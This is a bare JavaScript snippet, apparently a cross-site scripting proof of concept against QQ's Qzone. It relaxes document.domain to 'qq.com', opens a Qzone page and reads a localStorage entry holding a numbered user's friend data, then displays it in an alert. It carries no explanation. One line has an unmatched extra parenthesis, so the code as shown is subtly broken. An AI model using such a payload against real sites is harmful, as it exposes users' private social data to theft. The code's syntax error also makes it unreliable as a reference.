document.domain="qq.com";
alert(777);
setTimeout('var a = window.open("https://user.qzone.qq.com/troubleshooter?traytip")',2000));
setTimeout('alert(a.localStorage.getItem("app_friends_649114132"))',3000);
